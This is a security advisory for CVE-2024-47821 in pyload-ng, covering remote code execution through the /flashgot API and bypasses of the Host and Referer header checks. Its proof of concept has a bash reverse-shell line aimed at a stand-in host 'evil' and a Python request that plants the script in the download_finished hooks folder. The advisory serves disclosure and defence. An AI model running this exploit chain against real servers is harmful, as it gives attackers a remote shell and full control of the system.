# pyLoad vulnerable to remote code execution by download to /.pyload/scripts using /flashgot API

**GHSA**: GHSA-w7hq-f2pj-c53g | **CVE**: CVE-2024-47821 | **Severity**: high (CVSS 9.1)

**CWE**: CWE-78

**Affected Packages**:
- **pyload-ng** (pip): < 0.5.0b3.dev87

## Description

### Summary
The folder `/.pyload/scripts` has scripts which are run when certain actions are completed, for e.g. a download is finished. By downloading a executable file to a folder in /scripts and performing the respective action, remote code execution can be achieved. A file can be downloaded to such a folder by changing the download folder to a folder in `/scripts` path and using the `/flashgot` API to download the file.

### Details

**Configuration changes**
1. Change the download folder to `/home/<user>/.pyload/scripts`
2. Change permissions for downloaded files:
    1. Change permissions of downloads: on
    2. Permission mode for downloaded files: 0744

**Making the request to download files**

The `flashgot` API provides functionality to download files from a provided URL. Although pyload tries to prevent non-local requests from being able to reach this API, it relies on checking the Host header and the Referer header of the incoming request. Both of these can be set by an attacker to arbitrary values, thereby bypassing these checks.

*Referer header check*
```
def flashgot():
    if flask.request.referrer not in (
        "http://localhost:9666/flashgot",
        "http://127.0.0.1:9666/flashgot",
    ):
        flask.abort(500)
  ...
```
*Host header check for local check*
```
def local_check(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        remote_addr = flask.request.environ.get("REMOTE_ADDR", "0")
        http_host = flask.request.environ.get("HTTP_HOST", "0")

        if remote_addr in ("127.0.0.1", "::ffff:127.0.0.1", "::1", "localhost") or http_host in (
            "127.0.0.1:9666",
            "[::1]:9666",
        ):
            return func(*args, **kwargs)
        else:
            return "Forbidden", 403

    return wrapper
```

Once the file is downloaded to a folder in the scripts folder, the attacker can perform the respective action, and the script will be executed


### PoC
Create a malicious file. I have created a reverse shell
```
#!/bin/bash
bash -i >& /dev/tcp/evil/9002 0>&1
```

Host this file at some URL, for eg: http://evil

Create a request like this for the `flashgot` API. I am using `download_finished` folder as the destination folder. Scripts in this folder are run when a download is completed.
```
import requests

url = "http://pyload/flashgot"
headers = {"host": "127.0.0.1:9666", "Referer": "http://127.0.0.1:9666/flashgot"}

data = {
    "package": "download_finished",  
    "passwords": "optional_password",  
    "urls": "http://evil/exp.sh",
    "autostart": 1,
}


response = requests.post(url, data=data, headers=headers)
```
When the above request is made, exp.sh will be downloaded to `/scripts/download_finished folder`. For all subsequent downloads, this script will be run. Sending the request again causes a download of the file again, and when the download is complete, the script is run.

I also have a listener on my machine which receives the request from the pyload server. When the script executes, I get a connection back to my machine

### Screenshots
*Download folder*

<img width="672" alt="1" src="https://github.com/user-attachments/assets/77fc5202-bed2-41a2-98ae-9cb7b1315f76">

*`exp.sh` is downloaded*

<img width="714" alt="2" src="https://github.com/user-attachments/assets/5e6e19db-2a5c-48f4-9973-817528b5b9ec">

*Script is run*

<img width="714" alt="3" src="https://github.com/user-attachments/assets/34fbdaee-50ba-46a8-a372-ec8c91d03aa9">

*Reverse shell connection is received*

<img width="314" alt="4" src="https://github.com/user-attachments/assets/4713d56e-e850-47ad-99b3-cab0c7bba800">


### Impact
This vulnerability allows an attacker with access to change the settings on a pyload server to execute arbitrary code and completely compromise the system

